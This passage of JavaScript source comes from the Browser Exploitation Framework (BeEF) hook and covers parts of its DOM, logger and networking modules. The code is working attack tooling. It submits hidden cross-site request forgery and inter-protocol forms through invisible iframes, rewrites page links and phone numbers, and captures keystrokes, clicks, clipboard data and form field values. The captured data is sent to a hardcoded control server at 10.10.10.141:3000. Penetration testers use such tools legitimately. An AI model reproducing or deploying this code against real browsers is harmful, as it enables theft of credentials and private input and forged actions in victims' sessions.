        return (obj.nodeType) ? true : false;
    },

    /**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
    createInvisibleIframe: function() {
        var iframe = this.createElement('iframe', {
            width: '1px',
            height: '1px',
            style: 'visibility:hidden;'
        });

        document.body.appendChild(iframe);

        return iframe;
    },

    /**
	 * Returns the highest current z-index
	 * @param: {Boolean} whether to return an associative array with the height AND the ID of the element
	 * @return: {Integer} Highest z-index in the DOM
	 * OR
	 * @return: {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
	 */
    getHighestZindex: function(include_id) {
        var highest = {
            'height': 0,
            'elem': ''
        };
        $j('*').each(function() {
            var current_high = parseInt($j(this).css("zIndex"), 10);
            if (current_high > highest.height) {
                highest.height = current_high;
                highest.elem = $j(this).attr('id');
            }
        });

        if (include_id) {
            return highest;
        } else {
            return highest.height;
        }
    },

    /**
     * Create an iFrame element and prepend to document body. URI passed via 'src' property of function's 'params' parameter
     * is assigned to created iframe tag's src attribute resulting in GET request to that URI.
     * example usage in the code: beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
     *
	 */
    createIframe: function(type, params, styles, onload) {
        var css = {};

        if (type == 'hidden') {
            css = $j.extend(true, {
                'border': 'none',
                'width': '1px',
                'height': '1px',
                'display': 'none',
                'visibility': 'hidden'
            }, styles);
        } else if (type == 'fullscreen') {
            css = $j.extend(true, {
                'border': 'none',
                'background-color': 'white',
                'width': '100%',
                'height': '100%',
                'position': 'absolute',
                'top': '0px',
                'left': '0px',
                'z-index': beef.dom.getHighestZindex() + 1
            }, styles);
            $j('body').css({
                'padding': '0px',
                'margin': '0px'
            });
        } else {
            css = styles;
            $j('body').css({
                'padding': '0px',
                'margin': '0px'
            });
        }
        var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');

        return iframe;
    },

    /**
     * Load the link (href value) in an overlay foreground iFrame.
     * The BeEF hook continues to run in background.
     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
     * Framebusting techniques, this will not work.
     */
    persistentIframe: function() {
        $j('a').click(function(e) {
            if ($j(this).attr('href') != '') {
                e.preventDefault();
                beef.dom.createIframe('fullscreen', {
                    'src': $j(this).attr('href')
                }, {}, null);
                $j(document).attr('title', $j(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },

    /**
     * Load a full screen div that is black, or, transparent
     * @param: {Boolean} vis: whether or not you want the screen dimmer enabled or not
     * @param: {Hash} options: a collection of options to customise how the div is configured, as follows:
     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
     *           // By default this is 70 
     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
     *           // By default this will use beef.dom.getHighestZindex to always go to the top
     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
     *           // By default this is #000000
     */
    grayOut: function(vis, options) {
        // in any order.  Pass only the properties you need to set.
        var options = options || {};
        var zindex = options.zindex || beef.dom.getHighestZindex() + 1;
        var opacity = options.opacity || 70;
        var opaque = (opacity / 100);
        var bgcolor = options.bgcolor || '#000000';
        var dark = document.getElementById('darkenScreenObject');
        if (!dark) {
            // The dark layer doesn't exist, it's never been created.  So we'll
            // create it here and apply some basic styles.
            // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
            var tbody = document.getElementsByTagName("body")[0];
            var tnode = document.createElement('div');
            // Create the layer.
            tnode.style.position = 'absolute';
            // Position absolutely
            tnode.style.top = '0px';
            // In the top
            tnode.style.left = '0px';
            // Left corner of the page
            tnode.style.overflow = 'hidden';
            // Try to avoid making scroll bars            
            tnode.style.display = 'none';
            // Start out Hidden
            tnode.id = 'darkenScreenObject';
            // Name it so we can find it later
            tbody.appendChild(tnode);
            // Add it to the web page
            dark = document.getElementById('darkenScreenObject');
            // Get the object.
        }
        if (vis) {
            // Calculate the page width and height 
            if (document.body && (document.body.scrollWidth || document.body.scrollHeight)) {
                var pageWidth = document.body.scrollWidth + 'px';
                var pageHeight = document.body.scrollHeight + 'px';
            } else if (document.body.offsetWidth) {
                var pageWidth = document.body.offsetWidth + 'px';
                var pageHeight = document.body.offsetHeight + 'px';
            } else {
                var pageWidth = '100%';
                var pageHeight = '100%';
            }
            //set the shader to cover the entire page and make it visible.
            dark.style.opacity = opaque;
            dark.style.MozOpacity = opaque;
            dark.style.filter = 'alpha(opacity=' + opacity + ')';
            dark.style.zIndex = zindex;
            dark.style.backgroundColor = bgcolor;
            dark.style.width = pageWidth;
            dark.style.height = pageHeight;
            dark.style.display = 'block';
        } else {
            dark.style.display = 'none';
        }
    },

    /**
	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
	 *  or, re-writing a document this is useful.
	 */
    removeStylesheets: function() {
        $j('link[rel=stylesheet]').remove();
        $j('style').remove();
    },

    /**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
    createForm: function(params, append) {
        var form = $j('<form></form>').attr(params);
        if (append)
            $j('body').append(form);
        return form;
    },

    loadScript: function(url) {
        var s = document.createElement('script');
        s.type = 'text/javascript';
        s.src = url;
        $j('body').append(s);
    },

    /**
	 * Get the location of the current page.
	 * @return: the location.
	 */
    getLocation: function() {
        return document.location.href;
    },

    /**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
    getLinks: function() {
        var linksarray = [];
        var links = document.links;
        for (var i = 0; i < links.length; i++) {
            linksarray = linksarray.concat(links[i].href)
        }
        ;return linksarray
    },

    /**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
    rewriteLinks: function(url, selector) {
        var sel = (selector == null) ? 'a' : selector;
        return $j(sel).each(function() {
            if ($j(this).attr('href') != null) {
                $j(this).attr('href', url).click(function() {
                    return true;
                });
            }
        }).length;
    },

    /**
	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
    rewriteLinksClickEvents: function(url, selector) {
        var sel = (selector == null) ? 'a' : selector;
        return $j(sel).each(function() {
            if ($j(this).attr('href') != null) {
                $j(this).click(function() {
                    this.href = url
                });
            }
        }).length;
    },

    /**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
    rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

        var count = 0;
        var re = new RegExp(old_protocol + "://","gi");
        var sel = (selector == null) ? 'a' : selector;

        $j(sel).each(function() {
            if ($j(this).attr('href') != null) {
                var url = $j(this).attr('href');
                if (url.match(re)) {
                    $j(this).attr('href', url.replace(re, new_protocol + "://")).click(function() {
                        return true;
                    });
                    count++;
                }
            }
        });

        return count;
    },

    /**
	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
	 * @param: {String} new_number: the new link telephone number to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
    rewriteTelLinks: function(new_number, selector) {

        var count = 0;
        var re = new RegExp("tel:/?/?.*","gi");
        var sel = (selector == null) ? 'a' : selector;

        $j(sel).each(function() {
            if ($j(this).attr('href') != null) {
                var url = $j(this).attr('href');
                if (url.match(re)) {
                    $j(this).attr('href', url.replace(re, "tel:" + new_number)).click(function() {
                        return true;
                    });
                    count++;
                }
            }
        });

        return count;
    },

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params) {
        var result = '';
        for (i in params) {
            var param = params[i];
            for (key in param) {
                result += "<param name='" + key + "' value='" + param[key] + "' />";
            }
        }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
            "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " + "height='0' width='0' name='" + name + "'> " + "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }
            if (archive != null) {
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {

            if (codebase != null) {
                content = "" + "<applet id='" + id + "' code='" + code + "' " + "codebase='" + codebase + "' " + "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" + "<applet id='" + id + "' code='" + code + "' " + "archive='" + archive + "' " + "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
        //        if (beef.browser.isFF()) {
        //            if (codebase != null) {
        //                content = "" +
        //                    "<embed id='" + id + "' code='" + code + "' " +
        //                    "type='application/x-java-applet' codebase='" + codebase + "' " +
        //                    "height='0' width='0' name='" + name + "'>";
        //            } else {
        //                content = "" +
        //                    "<embed id='" + id + "' code='" + code + "' " +
        //                    "type='application/x-java-applet' archive='" + archive + "' " +
        //                    "height='0' width='0' name='" + name + "'>";
        //            }
        //
        //            if (params != null) {
        //                content += beef.dom.parseAppletParams(params);
        //            }
        //            content += "</embed>";
        //        }
        $j('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $j('#' + id + '').detach();
    },

    /**
     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
     * @params: {String} action: the form action attribute, where the request will be sent.
     * @params: {String} method: HTTP method, usually POST.
     * @params: {String} enctype: form encoding type
     * @params: {Array} inputs: an array of inputs to be added to the form (type, name, value).
     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
     */
    createIframeXsrfForm: function(action, method, enctype, inputs) {
        var iframeXsrf = beef.dom.createInvisibleIframe();

        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action', action);
        formXsrf.setAttribute('method', method);
        formXsrf.setAttribute('enctype', enctype);

        var input = null;
        for (i in inputs) {
            var attributes = inputs[i];
            input = document.createElement('input');
            for (key in attributes) {
                if (key == 'name' && attributes[key] == 'submit') {
                    // workaround for https://github.com/beefproject/beef/issues/1117
                    beef.debug("createIframeXsrfForm - warning: changed form input 'submit' to 'Submit'");
                    input.setAttribute('Submit', attributes[key]);
                } else {
                    input.setAttribute(key, attributes[key]);
                }
            }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();

        return iframeXsrf;
    },

    /**
     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
     * @params: {String} rhost: remote host ip/domain
     * @params: {String} rport: remote port
     * @params: {String} commands: protocol commands to be executed by the remote host:port service
     */
    createIframeIpecForm: function(rhost, rport, path, commands) {
        var iframeIpec = beef.dom.createInvisibleIframe();

        var formIpec = document.createElement('form');
        formIpec.setAttribute('action', 'http://' + rhost + ':' + rport + path);
        formIpec.setAttribute('method', 'POST');
        formIpec.setAttribute('enctype', 'multipart/form-data');

        input = document.createElement('textarea');
        input.setAttribute('name', Math.random().toString(36).substring(5));
        input.value = commands;
        formIpec.appendChild(input);
        iframeIpec.contentWindow.document.body.appendChild(formIpec);
        formIpec.submit();

        return iframeIpec;
    }

};

beef.regCmp('beef.dom');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {

    running: false,
    /**
    * Internal logger id
    */
    id: 0,
    /**
	 * Holds events created by user, to be sent back to BeEF
	 */
    events: [],
    /**
	 * Holds current stream of key presses
	 */
    stream: [],
    /**
	 * Contains current target of key presses
	 */
    target: null,
    /**
	 * Holds the time the logger was started
	 */
    time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
        this.mods = null;
    },
    /**
     * Prevents from recursive event handling on form submission
     */
    in_submit: false,

    /**
	 * Starts the logger
	 */
    start: function() {

        beef.browser.hookChildFrames();
        this.running = true;
        var d = new Date();
        this.time = d.getTime();

        $j(document).off('keypress');
        $j(document).off('click');
        $j(window).off('focus');
        $j(window).off('blur');
        $j('form').off('submit');
        $j(document.body).off('copy');
        $j(document.body).off('cut');
        $j(document.body).off('paste');

        if (!!window.console && typeof window.console == "object") {
            try {
                var oldInfo = window.console.info;
                console.info = function(message) {
                    beef.logger.console('info', message);
                    oldInfo.apply(console, arguments);
                }
                ;
                var oldLog = window.console.log;
                console.log = function(message) {
                    beef.logger.console('log', message);
                    oldLog.apply(console, arguments);
                }
                ;
                var oldWarn = window.console.warn;
                console.warn = function(message) {
                    beef.logger.console('warn', message);
                    oldWarn.apply(console, arguments);
                }
                ;
                var oldDebug = window.console.debug;
                console.debug = function(message) {
                    beef.logger.console('debug', message);
                    oldDebug.apply(console, arguments);
                }
                ;
                var oldError = window.console.error;
                console.error = function(message) {
                    beef.logger.console('error', message);
                    oldError.apply(console, arguments);
                }
                ;
            } catch (e) {}
        }

        $j(document).keypress(function(e) {
            beef.logger.keypress(e);
        }).click(function(e) {
            beef.logger.click(e);
        });
        $j(window).focus(function(e) {
            beef.logger.win_focus(e);
        }).blur(function(e) {
            beef.logger.win_blur(e);
        });
        $j('form').submit(function(e) {
            beef.logger.submit(e);
        });
        $j(document.body).on('copy', function() {
            setTimeout("beef.logger.copy();", 10);
        });
        $j(document.body).on('cut', function() {
            setTimeout("beef.logger.cut();", 10);
        });
        $j(document.body).on('paste', function() {
            beef.logger.paste();
        });
    },

    /**
	 * Stops the logger
	 */
    stop: function() {
        this.running = false;
        clearInterval(this.timer);
        $j(document).off('keypress');
        $j(document).off('click');
        $j(window).off('focus');
        $j(window).off('blur');
        $j('form').off('submit');
        $j(document.body).off('copy');
        $j(document.body).off('cut');
        $j(document.body).off('paste');
        // TODO: reset console
    },

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

    /**
	 * Click function fires when the user clicks the mouse.
	 */
    click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
    },

    /**
	 * Fires when the window element has regained focus
	 */
    win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
    },

    /**
	 * Fires when the window element has lost focus
	 */
    win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
        this.events.push(b);
    },

    /**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
    keypress: function(e) {
        if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0))) {
            beef.logger.push_stream();
            this.target = e.target;
        }
        this.stream.push({
            'char': e.which,
            'modifiers': {
                'alt': e.altKey,
                'ctrl': e.ctrlKey,
                'shift': e.shiftKey
            }
        });
    },

    /**
	 * Copy function fires when the user copies data to the clipboard.
	 */
    copy: function(x) {
        try {
            var c = new beef.logger.e();
            c.type = 'copy';
            c.data = clipboardData.getData("Text");
            this.events.push(c);
        } catch (e) {}
    },

    /**
	 * Cut function fires when the user cuts data to the clipboard.
	 */
    cut: function() {
        try {
            var c = new beef.logger.e();
            c.type = 'cut';
            c.data = clipboardData.getData("Text");
            this.events.push(c);
        } catch (e) {}
    },

    /**
         * Console function fires when data is sent to the browser console.
         */
    console: function(type, message) {
        try {
            var c = new beef.logger.e();
            c.type = 'console';
            c.data = type + ': ' + message;
            this.events.push(c);
        } catch (e) {}
    },

    /**
	 * Paste function fires when the user pastes data from the clipboard.
	 */
    paste: function() {
        try {
            var c = new beef.logger.e();
            c.type = 'paste';
            c.data = clipboardData.getData("Text");
            this.events.push(c);
        } catch (e) {}
    },

    /**
	 * Submit function fires whenever a form is submitted
     * TODO: Cleanup this function
	 */
    submit: function(e) {
        if (beef.logger.in_submit) {
            return true;
        }
        try {
            var f = new beef.logger.e();
            f.type = 'submit';
            f.target = beef.logger.get_dom_identifier(e.target);
            var jqForms = $j(e.target);
            var values = jqForms.find('input').map(function() {
                var inp = $j(this);
                return inp.attr('name') + '=' + inp.val();
            }).get().join();
            beef.debug('submitting form inputs: ' + values);
            /*
			for (var i = 0; i < e.target.elements.length; i++) {
	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
	        }
            */
            f.data = 'Action: ' + jqForms.attr('action') + ' - Method: ' + $j(e.target).attr('method') + ' - Values:\n' + values;
            this.events.push(f);
            this.queue();
            this.target = null;
            beef.net.flush(function done() {
                beef.debug("Submitting the form");
                beef.logger.in_submit = true;
                jqForms.submit();
                beef.logger.in_submit = false;
                beef.debug("Done submitting");
            });
            e.preventDefault();
            return false;
        } catch (e) {}
    },

    /**
	 * Pushes the current stream to the events queue
	 */
    push_stream: function() {
        if (this.stream.length > 0) {
            this.events.push(beef.logger.parse_stream());
            this.stream = [];
        }
    },

    /**
	 * Translate DOM Object to a readable string
	 */
    get_dom_identifier: function(target) {
        target = (target == null) ? this.target : target;
        var id = '';
        if (target) {
            id = target.tagName.toLowerCase();
            id += ($j(target).attr('id')) ? '#' + $j(target).attr('id') : ' ';
            id += ($j(target).attr('name')) ? '(' + $j(target).attr('name') + ')' : '';
        }
        return id;
    },

    /**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
    get_timestamp: function() {
        var d = new Date();
        return ((d.getTime() - this.time) / 1000).toFixed(3);
    },

    /**
	 * Parses stream array and creates history string
	 */
    parse_stream: function() {
        var s = '';
        var mods = '';
        for (var i in this.stream) {
            try {
                var mod = this.stream[i]['modifiers'];
                s += String.fromCharCode(this.stream[i]['char']);
                if (typeof mod != 'undefined' && (mod['alt'] == true || mod['ctrl'] == true || mod['shift'] == true)) {
                    mods += (mod['alt']) ? ' [Alt] ' : '';
                    mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
                    mods += (mod['shift']) ? ' [Shift] ' : '';
                    mods += String.fromCharCode(this.stream[i]['char']);
                }

            } catch (e) {}
        }
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        k.mods = mods;
        return k;
    },

    /**
	 * Queue results to be sent back to framework
	 */
    queue: function() {
        beef.logger.push_stream();
        if (this.events.length > 0) {
            beef.net.queue('/event', 0, this.events);
            this.events = [];
        }
    }

};

beef.regCmp('beef.logger');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions,
 * like beef.net.request and beef.net.forgeRequest,
 * used by BeEF command modules and the Requester extension,
 * as well as beef.net.send which is used to return commands
 * to BeEF server-side components.
 *
 * Also, it contains the core methods used by the XHR-polling
 * mechanism (flush, queue)
 */
beef.net = {

    host: "10.10.10.141",
    port: "3000",
    hook: "/hook.js",
    httpproto: "http",
    handler: '/dh',
    chop: 500,
    pad: 30,
    //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
    cmd_queue: [],

    /**
     * Command object. This represents the data to be sent back to BeEF,
     * using the beef.net.send() method.
     */
    command: function() {
        this.cid = null;
        this.results = null;
        this.status = null;
        this.handler = null;
        this.callback = null;
    },

    /**
     * Packet object. A single chunk of data. X packets -> 1 stream
     */
    packet: function() {
        this.id = null;
        this.data = null;
    },

    /**
     * Stream object. Contains X packets, which are command result chunks.
     */
    stream: function() {
        this.id = null;
        this.packets = [];
        this.pc = 0;
        this.get_base_url_length = function() {
            return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
        }
        ;
        this.get_packet_data = function() {
            var p = this.packets.shift();
            return {
                'bh': beef.session.get_hook_session_id(),
                'sid': this.id,
                'pid': p.id,
                'pc': this.pc,
                'd': p.data
            }
        }
        ;
    },

    /**
     * Response Object - used in the beef.net.request callback
     * NOTE: as we are using async mode, the response object will be empty if returned.
     * Using sync mode, request obj fields will be populated.
     */
    response: function() {
        this.status_code = null;
        // 500, 404, 200, 302
        this.status_text = null;
        // success, timeout, error, ...
        this.response_body = null;
        // "<html>…." if not a cross-origin request
        this.port_status = null;
        // tcp port is open, closed or not http
        this.was_cross_domain = null;
        // true or false
        this.was_timedout = null;
        // the user specified timeout was reached
        this.duration = null;
        // how long it took for the request to complete
        this.headers = null;
        // full response headers
    },

    /**
     * Queues the specified command results.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     */
    queue: function(handler, cid, results, status, callback) {
        if (typeof (handler) === 'string' && typeof (cid) === 'number' && (callback === undefined || typeof (callback) === 'function')) {
            var s = new beef.net.command();
            s.cid = cid;
            s.results = beef.net.clean(results);
            s.status = status;
            s.callback = callback;
            s.handler = handler;
            this.cmd_queue.push(s);
        }
    },

    /**
     * Queues the current command results and flushes the queue straight away.
     * NOTE: Always send Browser Fingerprinting results
     * (beef.net.browser_details(); -> /init handler) using normal XHR-polling,
     * even if WebSockets are enabled.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     * @return: {Integer} exec_status: the command module execution status (defaults to 0 - 'unknown' if status is null)
     */
    send: function(handler, cid, results, exec_status, callback) {
        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
        var status = 0;
        if (exec_status != null && parseInt(Number(exec_status)) == exec_status) {
            status = exec_status
        }

        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
            this.queue(handler, cid, results, status, callback);
            this.flush();
        } else {
            try {
                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid + '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) + '", "status": "' + exec_status + '", "callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
            } catch (e) {
                this.queue(handler, cid, results, status, callback);
                this.flush();
            }
        }

        return status;
    },

    /**
     * Flush all currently queued command results to the framework,
     * chopping the data in chunks ('chunk' method) which will be re-assembled
     * server-side by the network stack.
     * NOTE: currently 'flush' is used only with the default
     * XHR-polling mechanism. If WebSockets are used, the data is sent
     * back to BeEF straight away.
     */
    flush: function(callback) {
        if (this.cmd_queue.length > 0) {
            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
            this.cmd_queue.length = 0;
            this.sid_count++;
            var stream = new this.stream();
            stream.id = this.sid_count;
            var pad = stream.get_base_url_length() + this.pad;
            //cant continue if chop amount is too low
            if ((this.chop - pad) > 0) {
                var data = this.chunk(data, (this.chop - pad));
                for (var i = 1; i <= data.length; i++) {
                    var packet = new this.packet();
                    packet.id = i;
                    packet.data = data[(i - 1)];
                    stream.packets.push(packet);
                }
                stream.pc = stream.packets.length;
                this.push(stream, callback);
            }
        } else {
            if ((typeof callback != 'undefined') && (callback != null)) {
                callback();
            }
        }
    },

    /**
     * Split the input data into chunk lengths determined by the amount parameter.
     * @param: {String} str: the input data
     * @param: {Integer} amount: chunk length
     */
    chunk: function(str, amount) {
        if (typeof amount == 'undefined')
            n = 2;
        return str.match(RegExp('.{1,' + amount + '}', 'g'));
    },

    /**
     * Push the input stream back to the BeEF server-side components.
     * It uses beef.net.request to send back the data.
     * @param: {Object} stream: the stream object to be sent back.
     */
    push: function(stream, callback) {
        //need to implement wait feature here eventually
        if (typeof callback === 'undefined') {
            callback = null;
        }
        for (var i = 0; i < stream.pc; i++) {
            var cb = null;
            if (i == (stream.pc - 1)) {
                cb = callback;
            }
            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', cb);
        }
    },

    /**
     * Performs http requests
     * @param: {String} scheme: HTTP or HTTPS
     * @param: {String} method: GET or POST
     * @param: {String} domain: bindshell.net, 192.168.3.4, etc
     * @param: {Int} port: 80, 5900, etc
     * @param: {String} path: /path/to/resource
     * @param: {String} anchor: this is the value that comes after the # in the URL
     * @param: {String} data: This will be used as the query string for a GET or post data for a POST
     * @param: {Int} timeout: timeout the request after N seconds
     * @param: {String} dataType: specify the data return type expected (ie text/html/script)
     * @param: {Function} callback: call the callback function at the completion of the method
     *
     * @return: {Object} response: this object contains the response details
     */
    request: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
        //check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) {
            //strip eventual line breaks
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
            }
        }

        //build the url
        var url = "";
        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
            url = path;
        } else {
            url = scheme + "://" + domain;
            url = (port != null) ? url + ":" + port : url;
            url = (path != null) ? url + path : url;
            url = (anchor != null) ? url + "#" + anchor : url;
        }

        //define response object
        var response = new this.response;
        response.was_cross_domain = cross_domain;
        var start_time = new Date().getTime();

        /*
         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
         * This will turn POSTs into GETs for remote-domain requests.
         */
        if (method == "POST") {
            $j.ajaxSetup({
                dataType: dataType
            });
        } else {
            $j.ajaxSetup({
                dataType: 'script'
            });
        }

        //build and execute the request
        $j.ajax({
            type: method,
            url: url,
            data: data,
            timeout: (timeout * 1000),

            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
            beforeSend: function(xhr) {
                if (method == "POST") {
                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                }
            },
            success: function(data, textStatus, xhr) {
                var end_time = new Date().getTime();
                response.status_code = xhr.status;
                response.status_text = textStatus;
                response.response_body = data;
                response.port_status = "open";
                response.was_timedout = false;
                response.duration = (end_time - start_time);
            },
            error: function(jqXHR, textStatus, errorThrown) {
                var end_time = new Date().getTime();
                response.response_body = jqXHR.responseText;
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.duration = (end_time - start_time);
                response.port_status = "open";
            },
            complete: function(jqXHR, textStatus) {
                response.status_code = jqXHR.status;
                response.status_text = textStatus;
                response.headers = jqXHR.getAllResponseHeaders();
                // determine if TCP port is open/closed/not-http
                if (textStatus == "timeout") {
                    response.was_timedout = true;
                    response.response_body = "ERROR: Timed out\n";
                    response.port_status = "closed";
                } else if (textStatus == "parsererror") {
                    response.port_status = "not-http";
                } else {
                    response.port_status = "open";
                }
            }
        }).always(function() {
            if (callback != null) {
                callback(response);
            }
        });
        return response;
    },

    /*
     * Similar to beef.net.request, except from a few things that are needed when dealing with forged requests:
     *  - requestid: needed on the callback
     *  - allowCrossDomain: set cross-domain requests as allowed or blocked
     *
     * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
     * Example usage:
     * beef.net.forge_request("http", "POST", "172.20.40.50", 8080, "/lulz",
     *   true, null, { foo: "bar" }, 5, 'html', false, null, function(response) {
     *   alert(response.response_body)})
     */
    forge_request: function(scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {

        if (domain == "undefined" || path == "undefined") {
            beef.debug("[beef.net.forge_request] Error: Malformed request. No host specified.");
            return;
        }

        // check if same domain or cross domain
        var cross_domain = true;
        if (document.domain == domain && document.location.protocol == scheme + ':') {
            if (document.location.port == "" || document.location.port == null) {
                cross_domain = !(port == "80" || port == "443");
